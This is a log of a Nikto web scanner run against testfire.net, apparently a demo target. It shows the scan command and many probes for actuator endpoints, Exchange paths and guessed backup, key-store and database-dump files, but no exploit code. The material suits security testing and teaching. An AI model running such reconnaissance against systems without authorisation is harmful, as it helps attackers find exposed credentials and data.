[NIKTO-SRV] INFO:     Started server process [124033]
[NIKTO-SRV] INFO:     Waiting for application startup.
[NIKTO-SRV] INFO:     Application startup complete.
[NIKTO-SRV] INFO:     Uvicorn running on http://0.0.0.0:8002 (Press CTRL+C to quit)
[NIKTO-SRV] INFO:     127.0.0.1:38576 - "GET /health HTTP/1.1" 200 OK
[NIKTO-SRV] 
[NIKTO-SRV] ======================================================================
[NIKTO-SRV] [NIKTO] Starting: /usr/bin/nikto -h testfire.net -p 80 -Format txt -Display 1234EP -followredirects -useragent Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0 -Tuning 1234579bx -maxtime 1200s
[NIKTO-SRV] ======================================================================
[NIKTO-SRV] [NIKTO] - Nikto v2.6.0
[NIKTO-SRV] [NIKTO] ---------------------------------------------------------------------------
[NIKTO-SRV] [NIKTO] + / sent cookie: JSESSIONID=FD35995641C24E8BF16922A78AEB7B08; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + Your Nikto installation is out of date.
[NIKTO-SRV] [NIKTO] + / sent cookie: JSESSIONID=DE5CE754F9FF609B116628238B08376B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + / sent cookie: JSESSIONID=F9C0E421267899DD7D978C120A22A054; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /server-status sent cookie: JSESSIONID=0CFE7D1D4B608BBEBF5FBD78004D0215; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /icons/ sent cookie: JSESSIONID=03A8C821629AF228B870B978FF1F2231; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /trace.axd sent cookie: JSESSIONID=FD2A90E3166E20FF9312CB20B950C6A8; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /nosuchfile.asp sent cookie: JSESSIONID=BBC658AC5BD311E5B39B592FC5FC9984; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /nosuchfile.aspx sent cookie: JSESSIONID=3C2CF48991DCEF1437C23708DD5E6183; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /localstart.asp sent cookie: JSESSIONID=EA60739188DAF08FF700F15524FEB1B3; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /docs/ sent cookie: JSESSIONID=0E9C7B745862B5CB90A1864FC0AFAC05; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /server sent cookie: JSESSIONID=9C654373B0BCDC5F375E153EE4B896BE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + Target IP:          65.61.137.117
[NIKTO-SRV] [NIKTO] + Target Hostname:    testfire.net
[NIKTO-SRV] [NIKTO] + Target Port:        80
[NIKTO-SRV] [NIKTO] + Platform:           Unknown
[NIKTO-SRV] [NIKTO] + Start Time:         2026-04-25 22:51:44 (GMT3)
[NIKTO-SRV] [NIKTO] ---------------------------------------------------------------------------
[NIKTO-SRV] [NIKTO] + Server: Apache-Coyote/1.1
[NIKTO-SRV] [NIKTO] + /cgi.cgi/ sent cookie: JSESSIONID=8E9B5A57D91AD98B402459F80CFF48D1; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /webcgi/ sent cookie: JSESSIONID=E8A33C02CBC6DDEDC226F3A1235E324B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cgi-914/ sent cookie: JSESSIONID=6BA6BB5AA87C1151942250F02C63AAE9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cgi-915/ sent cookie: JSESSIONID=29B83E4BB971A2953D67220EDB1DCDDC; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /bin/ sent cookie: JSESSIONID=CA5DE86F388617AC23A457D907941D6B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cgi/ sent cookie: JSESSIONID=0A93166965996600A26E59F4904ABC0A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /mpcgi/ sent cookie: JSESSIONID=AD6B4D45ED805A4038297BE08F145E9C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cgi-bin/ sent cookie: JSESSIONID=1195D6D6EFC67F654D2A59859F29503E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /ows-bin/ sent cookie: JSESSIONID=6A77B4B639DCB299F62A0B2F09708457; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cgi-sys/ sent cookie: JSESSIONID=E15C7F371E6C75F47C6F442126C5BC6A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cgi-local/ sent cookie: JSESSIONID=492C5888343D06F19AE8C54EBB8DBC4A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /htbin/ sent cookie: JSESSIONID=8F3F852F1093387F844EAF64AE3DE995; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cgibin/ sent cookie: JSESSIONID=9A0A223675DD50E6DA747AC4CEE62778; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cgis/ sent cookie: JSESSIONID=B5B40B509546DBF8A4B728990B9F5962; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /scripts/ sent cookie: JSESSIONID=6C8B42716FE67A410295C294D82CB959; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cgi-win/ sent cookie: JSESSIONID=36B3A468DD37B9FF4B1D28C819FC10E0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /fcgi-bin/ sent cookie: JSESSIONID=BA0F6AE63F5D32FA8B80670108A254D0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cgi-exe/ sent cookie: JSESSIONID=52D0CC15746726F9B93D8FBAAD3ACE12; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cgi-home/ sent cookie: JSESSIONID=61BFCF5A3605594D2C4D645D7D2D484E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cgi-perl/ sent cookie: JSESSIONID=CC744259819DE85A4D2468EA314480E8; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /scgi-bin/ sent cookie: JSESSIONID=5C8C44FAE425267CEEE3D107B0DF4617; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cgi-bin-sdb/ sent cookie: JSESSIONID=26C1A38A0FC684B963928BD6D5948A6A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cgi-mod/ sent cookie: JSESSIONID=727A04C6A9EBEE88536B65B275823AF1; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + No CGI Directories found (use '-C all' to force check all possible dirs). CGI tests skipped.
[NIKTO-SRV] [NIKTO] + / sent cookie: JSESSIONID=498D8A01AAC0228CA3AAF1ACC2FB7147; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /robots.txt sent cookie: JSESSIONID=734DA1D55D4752A14A72F7A0D5FE2B95; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.php sent cookie: JSESSIONID=F75FA87115422EC3C16B893990629E08; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.php3 sent cookie: JSESSIONID=C528CBD0BAC982D0FA977628CEA217F4; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.php4 sent cookie: JSESSIONID=46F15D8759A0574D6C159333B2E467F8; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.php5 sent cookie: JSESSIONID=E11A162DB930B2C8D3A82FEECCE61829; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.php7 sent cookie: JSESSIONID=F5A776E3BF727360BAE80925C2FC5AC1; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.html sent cookie: JSESSIONID=5E0FF0D6DBABD11EC690485C274B47A2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.htm sent cookie: JSESSIONID=18EF23BE537A6DFA55B50F5386D9824A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.shtml sent cookie: JSESSIONID=E7F8A2FE77FF66AE7CDE25ABF999712B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.cfm sent cookie: JSESSIONID=40E11BD00675E8F10CE2586F91960CD5; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.cgi sent cookie: JSESSIONID=6EC65A132A8F20F9A48BB91E385277FE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.pl sent cookie: JSESSIONID=829DDDEC0652C534F0FD31AC655F4B8D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.asp sent cookie: JSESSIONID=A98EDE0BBF2607F7C43B3BF2E593CD2A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.aspx sent cookie: JSESSIONID=19AA58367FF44D386C8D8565181FBB62; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /default.asp sent cookie: JSESSIONID=9AB5DF43A4F6BE9C3A78320F8CDB28E9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /default.aspx sent cookie: JSESSIONID=2FFD3A6F40946DB0E42AAADEDF6C1427; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /default.htm sent cookie: JSESSIONID=0BBECD0BDC5497DB85D9BF5A50E22AFE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.do sent cookie: JSESSIONID=2A7CC78E248CED21F7EF2053B58FC139; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.jhtml sent cookie: JSESSIONID=6C705E9485A4483C2CE73BED8685F0D1; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.jsp sent cookie: JSESSIONID=47DF35A996F78C30DB8723AF821A7268; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.xml sent cookie: JSESSIONID=FA95117E9544CBAEEC0F324EA9D14CA6; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /favicon.ico sent cookie: JSESSIONID=F4AF44E9618D4D8B3B9516C40E9B8366; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /favicons/favicon.ico sent cookie: JSESSIONID=D098F87F1914640FE24F00996073A3A0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /favicon.gif sent cookie: JSESSIONID=50C3591AE8849FAC680A874A5283E8D0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /favicons/favicon.gif sent cookie: JSESSIONID=01E5EE5310475FFF5894B9BB57B07455; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /favicon.png sent cookie: JSESSIONID=4C9E73B3E416044AF5D90D323CFE3A30; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /favicons/favicon.png sent cookie: JSESSIONID=87D3BB17412FACDE9BC27718EA2AA9A2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + / sent cookie: JSESSIONID=302AA08569B860DF8F717ADB18F8F681; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + / sent cookie: JSESSIONID=42F7060AFAAA0DF99A12B42D596E095A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /actuator sent cookie: JSESSIONID=F50BFDB0A9A8D32730085075C168D429; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /actuator/health sent cookie: JSESSIONID=AEF82792738BFA0529616F2004879458; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /actuator/info sent cookie: JSESSIONID=6EB64AA0BC48C6A916B496071D199C20; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /actuator/env sent cookie: JSESSIONID=D376C5F763AF14C745C0B131828D3974; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /actuator/mappings sent cookie: JSESSIONID=61782C4F9792CFA179B523CF22F0969C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /actuator/metrics sent cookie: JSESSIONID=43C05AA8C3271FFA264944966236A2FB; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /actuator/beans sent cookie: JSESSIONID=B0FF2177B264D2378C5A758BCAC3F7E9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /actuator/configprops sent cookie: JSESSIONID=78980D95227CA8DC00A7D24016079B56; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /actuator/loggers sent cookie: JSESSIONID=4C5F80DE3CE4A6D5A437329BCCD4510A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /actuator/threaddump sent cookie: JSESSIONID=CE34C329A94FE217B963E92E0D18D87F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /actuator/auditevents sent cookie: JSESSIONID=5790A64460623AE1F1EBD13620E18695; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /actuator/httptrace sent cookie: JSESSIONID=B13D31C6835A4151BD97CBB923383031; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /actuator/scheduledtasks sent cookie: JSESSIONID=C9DF13DC403DA4B82E582AC794C5CD71; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /actuator/heapdump sent cookie: JSESSIONID=E27F690FD8755C2BAFC5F6E8938963DF; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /actuator/jolokia sent cookie: JSESSIONID=10E02187415CCA32556C2662EA0240E2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /actuator/prometheus sent cookie: JSESSIONID=B938421CA5F411029033BCEFF538BB3F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.asp sent cookie: JSESSIONID=641F4A6EEC552CDA4DB9A0D005DE72F2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /njkk999.asp sent cookie: JSESSIONID=7DF993BF2042D66021FD91592A9E7CBE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.aspx sent cookie: JSESSIONID=DF4CCCF57B7CE88416035F7D24D7D551; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /jkl988.aspx sent cookie: JSESSIONID=3B5EF39DD6F0AC336D245BD4F38E23A7; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /login.asp sent cookie: JSESSIONID=DE814BE57382E4E6E46896E2AF52913D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /login.aspx sent cookie: JSESSIONID=85C6BA69A3432765B9B437F48BB161C9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + / sent cookie: JSESSIONID=ECDA937AD656B96097F4FAE4B2941FC3; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + http://localhost/images/ sent cookie: JSESSIONID=B7FEB936268B1BD7AFB06232D02FA75B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /Autodiscover/Autodiscover.xml sent cookie: JSESSIONID=390655C1AB5EB84085AC8F6084F5C860; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /Autodiscover/ sent cookie: JSESSIONID=87BE8B57579E8D217C9EA3939B75B5E7; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /Microsoft-Server-ActiveSync sent cookie: JSESSIONID=100C91CF10DB169AA9E114EED84E4042; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /Microsoft-Server-ActiveSync/default.css sent cookie: JSESSIONID=D9EE40DCC50E892467E73366C3B46451; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /ECP sent cookie: JSESSIONID=FEBFC1318CCF4AD6CE9527B6BAFF72CD; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /EWS sent cookie: JSESSIONID=C50AAD9D1E9B72EA9F9C0023515441E1; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /EWS/Exchange.asmx sent cookie: JSESSIONID=AA231A7D9A71B50778555406A0D488FE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /Exchange sent cookie: JSESSIONID=586D3F30CBB477FAD1D09453698B30D9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /OWA sent cookie: JSESSIONID=60013269A66E9DA0B02776F43B1A5519; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /Microsoft-Server-ActiveSync/default.eas sent cookie: JSESSIONID=7522B203367A4F0F3D7E3CA5BD64F425; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /Rpc sent cookie: JSESSIONID=1A6EF624891DC79C6F20D1D255D570D1; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /EWS/Services.wsdl sent cookie: JSESSIONID=88A2D14CA9BC56E79F5FFD9E761509CD; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /ecp sent cookie: JSESSIONID=B13031BCFFDA82FE4C1C546F0DBC3556; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /OAB sent cookie: JSESSIONID=8745FB0CDB56E25926A899B1F56C2E39; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /aspnet_client sent cookie: JSESSIONID=059E1DB8BA4D10981D4E94DFB12D2734; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /PowerShell sent cookie: JSESSIONID=BB599735B991CA597967906DC921EACD; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + / sent cookie: JSESSIONID=A59556F1417D73FF8A236DFFA3D25918; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + / sent cookie: JSESSIONID=A1753A53DA20335E2B272C4F8F6CDE7B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + / sent cookie: JSESSIONID=499E45622D61E92F8E65D18245B78097; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + [013587] /: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
[NIKTO-SRV] [NIKTO] + [013587] /: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
[NIKTO-SRV] [NIKTO] + [013587] /: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
[NIKTO-SRV] [NIKTO] + [013587] /: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
[NIKTO-SRV] [NIKTO] + [013587] /: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy
[NIKTO-SRV] [NIKTO] + /testfirenet.cer sent cookie: JSESSIONID=94E4B411E77529C64522DBC2B2A7DD66; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.cer sent cookie: JSESSIONID=1580B0B34EAC797042E539778FF9CD9F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.jks sent cookie: JSESSIONID=974CE46956CD9B3DB256CCB78D945C9F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.jks sent cookie: JSESSIONID=34809042D812A9F88A15E4E1FA014BAA; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.tar.lzma sent cookie: JSESSIONID=E7549406C216CF4E6F65F2B4D0E61389; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.tar.lzma sent cookie: JSESSIONID=9864699296A63E1505593CF72C75A1DC; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.war sent cookie: JSESSIONID=13BF54D2801F04C003761AEE42C5D610; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.war sent cookie: JSESSIONID=BAE4A0AFD1D55FF4242AEDA7A4C2FB5F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.jks sent cookie: JSESSIONID=F42925AA6BBDC1CA6BACF1C0EC87EAE5; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.jks sent cookie: JSESSIONID=97C57068E8D2984C6E2E5E8FB06C4131; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.gz sent cookie: JSESSIONID=40F7C601C0007905F5852593EE333A50; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.gz sent cookie: JSESSIONID=B4C31F6DE70E156276D5310493EB8630; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.egg sent cookie: JSESSIONID=7005E260093B82F8A3996B8B2BB73BE2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.egg sent cookie: JSESSIONID=12A6760D82976B2115A1425488AB6C56; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.gz sent cookie: JSESSIONID=C402825F6329346459CEC041E89CE1D9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.gz sent cookie: JSESSIONID=B18EDE28271FC3C03FBE7AB83A18B9D9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.war sent cookie: JSESSIONID=ADBF8AC67F9417E6F07E3026F3B083D4; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.war sent cookie: JSESSIONID=8C2D2324B2E36670211A77AC5187FEEA; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.jks sent cookie: JSESSIONID=EC4037897E36152CCE75E6B2F07F6E9C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.jks sent cookie: JSESSIONID=8B511A550DE1F11BB0AFD5EEEC62A484; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.tar.lzma sent cookie: JSESSIONID=5C90C1C7C17D2FC10802AAA6839CFA99; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.tar.lzma sent cookie: JSESSIONID=4CBDD92DCD69741FC0781AA291B60891; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.lzma sent cookie: JSESSIONID=CA50A9122502023B12FD83A5ED06DB0D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.lzma sent cookie: JSESSIONID=DAFA1A6833B8C8C0636ADBFFC204CE61; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.gz sent cookie: JSESSIONID=E144A22DA97A29EE666E625510EA519F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.gz sent cookie: JSESSIONID=6D9DE0C9C21133F4E8776F2C52EE8691; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.jks sent cookie: JSESSIONID=8A9955D4816A75CF8F573DB2B4598DE5; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.jks sent cookie: JSESSIONID=7F815EF21F55297C0424C3BD01F33266; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.war sent cookie: JSESSIONID=5AA96429B128409D7047985DB6E7BB34; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.war sent cookie: JSESSIONID=13732015E2119C3DF323810F2CA4641C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.tar.gz sent cookie: JSESSIONID=58B8893E1B16FD2B6395D53FE5B8A974; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.tar.gz sent cookie: JSESSIONID=89DAE04902D7371C0EFC83BD3C617A81; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.zip sent cookie: JSESSIONID=0FF7ED99AD574BC74E18D9674311F2D1; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.zip sent cookie: JSESSIONID=0545E6C4AD43DC2094A7F93F773C05EB; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.cer sent cookie: JSESSIONID=E209ED179C2F527EF96273D4AA4DDC53; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.cer sent cookie: JSESSIONID=2A7D08DA9D1B178F244379531AD6C763; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.egg sent cookie: JSESSIONID=07F9A170E816751810D5E8B3122DD057; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.egg sent cookie: JSESSIONID=8298E15FAAA476A6E5A136F666FF4031; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.tar sent cookie: JSESSIONID=A2306D322B0401F56DD8001E7E0C1862; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.tar sent cookie: JSESSIONID=CB73BB37F430F6E4CE034EAAD8F1A2C1; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.tar.lzma sent cookie: JSESSIONID=475A4D7E3E1F6A737BC2C58A693350B0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.tar.lzma sent cookie: JSESSIONID=C66556D80C73D76E40500AE2921093AE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.tgz sent cookie: JSESSIONID=36CD3CA9C719E3C0B87C9A4DF7753ACF; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.tgz sent cookie: JSESSIONID=1569DD8E1867ACF538A87792AB798C7D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.lzma sent cookie: JSESSIONID=5D7DEC4821D2264C093FBD8B6BF47E5B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.lzma sent cookie: JSESSIONID=7C25B960BB12B768509E5D77D76A595B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.jks sent cookie: JSESSIONID=06F4720F52AC8EC3B307063927F0DF01; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.jks sent cookie: JSESSIONID=FABDC7DE8BC87C60113C5A520BC513B2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.lzma sent cookie: JSESSIONID=B1E6B9F3D798B5C97E343540E3CC044A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.lzma sent cookie: JSESSIONID=6935BC77B7FC313EDEE0296E059A6A01; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.war sent cookie: JSESSIONID=7082887755E8E10632D114839C043519; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.war sent cookie: JSESSIONID=39BC6CEAA336E435AC8CD8E6F7395E53; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.sql sent cookie: JSESSIONID=963653D284140E589D79F84E079AFD60; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.sql sent cookie: JSESSIONID=D5797C0058CA9D113D068C44D2452BB1; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.tar.lzma sent cookie: JSESSIONID=B687AE03BA17C36235C3742BD367A10E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.tar.lzma sent cookie: JSESSIONID=9893557607B31B6FA9B9D70334EF65B5; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.bz2 sent cookie: JSESSIONID=023BAB23B8EE5EB0D24A9122597D69F9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.bz2 sent cookie: JSESSIONID=4909F40AC81B59E8F3F08B4A72E1E1B1; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.tar.lzma sent cookie: JSESSIONID=688AA76C5C3F513D524CC94A3713A689; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.tar.lzma sent cookie: JSESSIONID=1F81E63E4ACB6FD0ACA6C9BD2644C48C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.tgz sent cookie: JSESSIONID=D5A4D31FCB849ED8F2D31B9D9EE84C9E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.tgz sent cookie: JSESSIONID=2AAD0415816E1881C8CA192DCFB68530; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.pem sent cookie: JSESSIONID=22CE6FF6CD2B1E8EBD65D40AC87134FE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.pem sent cookie: JSESSIONID=BE9E8D83B5DAD365E077BE18238A81A6; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.tar.bz2 sent cookie: JSESSIONID=9D3D5F0A04A73817CA0B95D1A13489F7; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.tar.bz2 sent cookie: JSESSIONID=AAA0C96AC7E22A9D9563911659B8C9D9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.egg sent cookie: JSESSIONID=07CB18191581B1DD7747FEEEBAEDEEFE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.egg sent cookie: JSESSIONID=B11D8948E03BF7B5F632B6316E94F0BA; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.war sent cookie: JSESSIONID=24730A015F11AD6F75CDB75843C7B609; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.war sent cookie: JSESSIONID=A6CD2154079D0A344CD41C3D9C70C911; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.lzma sent cookie: JSESSIONID=3D02FD7A106FF073F445EA2837494077; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.lzma sent cookie: JSESSIONID=88F06616FB84578DB6C925F224C3943C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.gz sent cookie: JSESSIONID=D35F1AFB834CD5B034215AF0F56FBE60; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.gz sent cookie: JSESSIONID=9F4206DBD3E0541922CFAB6BF055DFC1; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.egg sent cookie: JSESSIONID=794604E576BDC1C3E1B4F71186FE543E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.egg sent cookie: JSESSIONID=9F7AA3D96CF83128600C285415EA86D1; Path=/; HttpOnly
